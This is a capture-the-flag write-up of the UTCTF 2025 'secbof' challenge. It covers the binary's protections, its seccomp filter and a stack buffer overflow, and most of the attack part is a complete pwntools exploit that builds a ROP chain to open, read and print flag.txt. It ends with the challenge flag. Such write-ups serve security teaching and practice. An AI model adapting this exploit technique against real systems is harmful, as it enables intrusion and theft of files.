# UTCTF 2025 - secbof Writeup
**Date:** March 17, 2025
**Author:** s1gn3rs

## Challenge Information

- **Category:** Binary Exploitation
- **Challenge Name:** secbof
- **Description:** A buffer overflow, but secure. Flag can be accessed at `./flag.txt`
- **Author:** Anthony (@stuckin414141 on Discord)
- **Connection:** `nc challenge.utctf.live 5141`

### Binary Security Features

```
Permissions:
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### Key Observations

- **No PIE:** ASLR is off, so we can use fixed addresses in our ROP chain.
- **Stack Canary:** We need to ensure we do not overwrite it incorrectly.
- **NX Enabled:** We cannot execute shellcode on the stack.
- **SHSTK & IBT Enabled:** These are mitigations for control-flow integrity, but we can bypass them with ROP.

---

## Binary Analysis

### Main Function (Decompiled via Ghidra)

```c
undefined8 main(void){
  undefined1 local_88[128];

  setvbuf((FILE *)stdout, (char *)0x0, 2, 0);
  setvbuf((FILE *)stdin, (char *)0x0, 2, 0);
  install_filter();
  printf("Input> ");
  read(0, local_88, 1000);
  printf("Flag: ");
  return 0;
}
```

### Important Findings
1. **`install_filter()` is applied**, meaning a seccomp filter is enforced.
2. **Buffer overflow vulnerability:** We can overwrite the saved RIP since `read()` allows 1000 bytes.
3. **Potential for ROP attacks:** Since the binary has many unused functions, we have a good number of gadgets.

### Seccomp Filter Analysis

```bash
seccomp-tools dump ./chal
```

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

- **Allowed syscalls:** `read`, `write`, `open`, and `exit`.
- We can still read the flag using a **ROP Chain** to call these syscalls correctly.

---

## Exploiting the Buffer Overflow

### Finding the Offset to RIP

Using GDB, we determine that the offset to the saved RIP is **0x88 bytes**. Although a stack canary is present in the binary, we found that **there is no canary** between the buffer and the saved RIP, allowing us to overwrite it directly

```bash
pwndbg> # p/x savedRip - bufferAddress
pwndbg> p/x 0x7fffffffdb38 - 0x7fffffffdab0
$1 = 0x88
```

### ROP Strategy

1. **Bypass seccomp restrictions** using `open`, `read`, and `write` syscalls.
2. **We cannot use `open` from the PLT** because it calls `openat`. Instead, we invoke the syscall manually.
3. **Open the flag file** `./flag.txt`.
4. **Read the flag** into a writable memory section.
5. **Write the flag** to stdout.
6. **Return to instruction `main+77`** to flush stdout.

---

## Exploit Code

```python
#!/usr/bin/env python3

from pwn import *

e = ELF("chal")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            b *main+114
            b *main+145
            b *0x44f980
            c
            c
            """)
    elif cond == 3:
        r = remote("challenge.utctf.live", 5141)
        #r = remote("localhost", 9000)

    return r


def main():
    r = conn(1)

    offsetRip = 0x88

    rop = ROP(e)               # Create a ROP object

    # Locate syscall PLT addresses
    open_plt = e.sym['open64']
    read_plt = e.sym['read']
    write_plt = e.sym['write']

    # Writable memory location (for buffer)
    bss_section = e.bss() + 0x100

    # Pop gadgets (found earlier)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    # 0x0000000000433a83 : mov qword ptr [rdi], rdx ; ret
    mov_qword_rdi_rdx = 0x0000000000433a83
    syscallRet = 0x000000000041ae16
    #0x000000000048630b : pop rdx ; pop rbx ; ret
    pop_rdx_rbx = 0x000000000048630b

    print(f"pop_rdi: {hex(pop_rdi)}")
    print(f"pop_rsi: {hex(pop_rsi)}")
    print(f"pop_rdx_rbx: {hex(pop_rdx_rbx)}")

    # ROP chain

    rop.raw(pop_rdi)  # File name
    rop.raw(p64(bss_section))
    rop.raw(pop_rdx_rbx)
    rop.raw(b"./flag.t")  # rdx = "./flag.t"
    rop.raw(p64(0))  # Dummy rbx
    rop.raw(p64(mov_qword_rdi_rdx))  # mov [rdi], rdx

    rop.raw(p64(pop_rdi))  # Set destination (bss_section + 8)
    rop.raw(p64(bss_section + 8))
    rop.raw(p64(pop_rdx_rbx))  # Set value ("xt\x00")
    rop.raw(b"xt\x00\x00\x00\x00\x00\x00")  # rdx = "xt\x00"
    rop.raw(p64(0))  # Dummy rbx
    rop.raw(p64(mov_qword_rdi_rdx))  # mov [rdi], rdx




    # 1 Open("flag.txt", O_RDONLY)
    rop.raw(pop_rdi)  # File name
    rop.raw(p64(bss_section))
    rop.raw(pop_rsi)  # O_RDONLY = 0
    rop.raw(p64(0))
    # rop.raw(open_plt)  # Call open()
    rop.raw(pop_rax)
    rop.raw(p64(2))
    rop.raw(syscallRet)

    # 2 Read(fd, buffer, 64)
    rop.raw(pop_rdi)  # File descriptor (assuming open() returns 3)
    rop.raw(p64(3))   # This is hardcoded be carefull!!!! I was too lazy to get another gadget
    # Maybe you will need to change it's value (fd=5 to docker or server)
    rop.raw(pop_rsi)  # Buffer to store flag
    rop.raw(p64(bss_section))
    rop.raw(pop_rdx_rbx)  # Read 64 bytes
    rop.raw(p64(64))
    rop.raw(p64(0))
    rop.raw(read_plt)  # Call read()

    # 3 Write(1, buffer, 64)
    rop.raw(pop_rdi)  # STDOUT file descriptor
    rop.raw(p64(1))
    rop.raw(pop_rsi)  # Buffer containing flag
    rop.raw(p64(bss_section))
    rop.raw(write_plt)  # Call write()
    rop.raw(e.sym['main'] + 77)  # Return to main



    # print(rop.dump())

    # Send payload
    r.sendline(fit({offsetRip: rop.chain()}))  # Overflow + ROP chain

    r.interactive()

if __name__ == "__main__":
    main()
```

---

## Flag

```
utflag{r0p_with_4_littl3_catch}
```
